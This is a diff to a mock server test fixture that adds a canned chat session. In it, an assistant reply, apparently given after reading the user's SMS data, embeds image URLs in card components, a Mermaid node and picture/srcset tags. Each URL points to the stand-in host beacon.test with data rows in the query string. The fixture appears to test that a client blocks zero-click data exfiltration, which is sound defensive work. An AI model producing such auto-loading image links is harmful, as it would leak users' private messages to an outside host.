@@ -805,6 +805,17 @@ wss.on('connection', ws => {
             ...(sid === 's-pd' ? [{ role: 'tool', name: 'phone_data', tool_call_id: 'pd-1', args: { kind: 'sms' } }] : []),
             { role: 'assistant', text }] })
         }
+        if (sid === 's-pd-leaks' || sid === 's-pd-leaks-ctl') {
+          // A chat that has read phone data whose reply tries the routes that load with no tap: a card's image components, a
+          // Mermaid image shape, <picture>/srcset. The remote host is beacon.test, with fake rows in the address.
+          const card = ['root = Card([head, pic, blk, gal])', 'head = CardHeader("Pictures")', 'pic = Image("alt", "https://beacon.test/card-image.png?d=ROWS")', 'blk = ImageBlock("https://beacon.test/card-block.png?d=ROWS", "alt")', 'gal = ImageGallery([{src: "https://beacon.test/card-gallery.png?d=ROWS", alt: "a"}])'].join('\n')
+          const text = ['Pictures:', '```openui-lang\n' + card + '\n```', '```mermaid\nflowchart LR\n  A@{ img: "https://beacon.test/mermaid.png?d=ROWS", label: "x", pos: "t", w: 60, h: 60, constraint: "on" }\n```',
+            '<picture><source srcset="http://beacon.test/srcset.png?d=ROWS 1x"><img srcset="http://beacon.test/srcset2.png?d=ROWS 2x" alt="p"></picture>'].join('\n\n')
+          return reply({ session_id: 'rt-' + sid, resumed: sid, session_key: sid, info: { model: 'mock-model' }, messages: [
+            { role: 'user', text: 'show me pictures', row_id: 1 },
+            ...(sid === 's-pd-leaks' ? [{ role: 'tool', name: 'phone_data', tool_call_id: 'pd-1', args: { kind: 'sms' } }] : []),
+            { role: 'assistant', text }] })
+        }
         if (sid === 's-stale') {
           // Hermes no longer holds the first question live (row 999 answers 4018 to an edit).
           return reply({ session_id: 'rt-stale', resumed: sid, session_key: sid, info: { model: 'mock-model' }, messages: [
